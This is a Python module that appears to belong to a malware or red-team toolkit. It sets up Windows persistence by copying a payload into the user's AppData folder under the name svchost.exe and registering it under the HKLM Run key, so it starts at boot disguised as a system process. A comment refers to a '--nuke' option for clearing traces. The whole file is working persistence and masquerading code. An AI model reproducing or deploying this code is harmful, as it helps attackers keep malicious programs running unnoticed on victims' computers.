import sys
if sys.platform == "win32":
    import winreg
else:
    winreg = None
import shutil
import os


class RUNKEY:
    def __init__(self, payload: str):
        self.payload      = payload
        self.current_user = os.getlogin()

    def _add_run_key(self, file):
        key_path   = r"Software\Microsoft\Windows\CurrentVersion\Run"
        value_name = "svchost"

        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, file)

            print("Run key added successfully.")
        except Exception as e:
            print("Error: {}".format(e))
    
    def _copy_and_rename(self, source_path, destination_path, new_filename):
        try:
            os.makedirs(destination_path, exist_ok=True) # Make sure dst folder exists!

            # Copy and rename file (--nuke / -n option will clear traces)
            new_file_path = os.path.join(destination_path, new_filename)
            shutil.copy(source_path, new_file_path)

            return new_file_path
        except Exception as e:
            print(f"Error: {e}")
            return None


    def install(self):
        dst           = "C:\\Users\\" + self.current_user + "\\AppData\\Roaming\\WindowsExtensions\\"
        new_file_path = self._copy_and_rename(self.payload, dst, "svchost.exe")

        self._add_run_key(new_file_path)
